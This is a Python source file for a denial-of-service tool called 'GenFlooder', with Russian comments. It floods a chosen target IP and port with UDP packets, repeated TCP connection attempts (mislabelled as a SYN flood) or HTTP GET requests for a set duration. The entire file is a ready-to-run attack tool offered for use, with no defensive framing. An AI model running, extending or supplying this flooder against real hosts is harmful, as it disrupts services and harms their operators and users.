import os
import socket
import threading
import time
import random
import sys
import requests
import colorama
from colorama import Fore
import aiohttp
import asyncio

colorama.init(autoreset=True)

def display_banner(): #логотип программы.
    banner_text = f"""
{Fore.LIGHTYELLOW_EX}
 .d8888b.                    8888888888 888                        888                  
d88P  Y88b                   888        888                        888                  
888    888                   888        888                        888                  
888         .d88b.  88888b.  8888888    888  .d88b.   .d88b.   .d88888  .d88b.  888d888 
888  88888 d8P  Y8b 888 "88b 888        888 d88""88b d88""88b d88" 888 d8P  Y8b 888P"   
888    888 88888888 888  888 888        888 888  888 888  888 888  888 88888888 888     
Y88b  d88P Y8b.     888  888 888        888 Y88..88P Y88..88P Y88b 888 Y8b.     888     
 "Y8888P88  "Y8888  888  888 888        888  "Y88P"   "Y88P"   "Y88888  "Y8888  888     
                                                                                        
                          {Fore.LIGHTRED_EX}UDP DoS | TCP SYN | HTTP Flood
"""
    print(banner_text)

def parse_arguments(): #Парсит и проверяет аргументы командной строки.
    if len(sys.argv) != 5:
        print(f"""
        {Fore.LIGHTYELLOW_EX}╭───────────────────────━━━━━━━━━━━━━━━━━━━━━───────────────────╮
        | {Fore.LIGHTGREEN_EX}Use » python {os.path.basename(__file__)} [target] [port] [duration] [attack_type] {Fore.LIGHTYELLOW_EX}| 
        | {Fore.LIGHTGREEN_EX}Type Attacks »              {Fore.LIGHTRED_EX}UDP  {Fore.LIGHTGREEN_EX}| {Fore.LIGHTRED_EX}TCP {Fore.LIGHTGREEN_EX}| {Fore.LIGHTRED_EX}HTTP                 {Fore.LIGHTYELLOW_EX}| 
        ╰───────────────────────━━━━━━━━━━━━━━━━━━━━━───────────────────╯
        """)
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    attack_type = sys.argv[4].upper()
    if attack_type not in ['UDP', 'TCP', 'HTTP']:
        print("Неверный тип атаки. Допустимые значения: UDP, TCP, HTTP")
        sys.exit(1)
    return target_ip, target_port, duration, attack_type

def check_target_availability(target_ip, target_port): #Проверяет доступность цели перед началом атаки.
    try:
        socket.create_connection((target_ip, target_port), timeout=5)
        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Цель доступна: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
        return True
    except socket.error:
        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Цель недоступна: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
        return False

def udp_attack(target_ip, target_port, duration): #Инициирует UDP-атаку на указанную цель.
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(65500)
    end_time = time.time() + duration
    packets_sent = 0

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Начата UDP-атака на {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}секунд.')

    while time.time() < end_time:
        udp_socket.sendto(packet_data, (target_ip, target_port))
        packets_sent += 1
    
    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP-атака завершена. Всего отправлено пакетов: {Fore.LIGHTGREEN_EX}{packets_sent}')

def tcp_syn_attack(target_ip, target_port, duration): #Инициирует TCP SYN-атаку на указанную цель.
    end_time = time.time() + duration
    packets_sent = 0

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Начата TCP SYN-атака на {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}секунд.')

    while time.time() < end_time:
        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            tcp_socket.connect((target_ip, target_port))
        except socket.error:
            pass
        tcp_socket.close()
        packets_sent += 1

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» TCP SYN-атака завершена. Всего попыток подключения: {Fore.LIGHTGREEN_EX}{packets_sent}')

async def http_flood_attack(target_ip, target_port, duration): #Инициирует HTTP Flood атаку на указанную цель.
    end_time = time.time() + duration
    requests_sent = 0

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Начата HTTP Flood атака на {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}секунд.')

    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            try:
                async with session.get(f"http://{target_ip}:{target_port}") as response:
                    requests_sent += 1
            except aiohttp.ClientError:
                pass

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» HTTP Flood атака завершена. Всего отправлено запросов: {Fore.LIGHTGREEN_EX}{requests_sent}')

if __name__ == "__main__":
    display_banner()
    target_ip, target_port, duration, attack_type = parse_arguments()

    if not check_target_availability(target_ip, target_port):
        sys.exit(1)

    if attack_type == 'UDP':
        udp_attack(target_ip, target_port, duration)
    elif attack_type == 'TCP':
        tcp_syn_attack(target_ip, target_port, duration)
    elif attack_type == 'HTTP':
        asyncio.run(http_flood_attack(target_ip, target_port, duration))
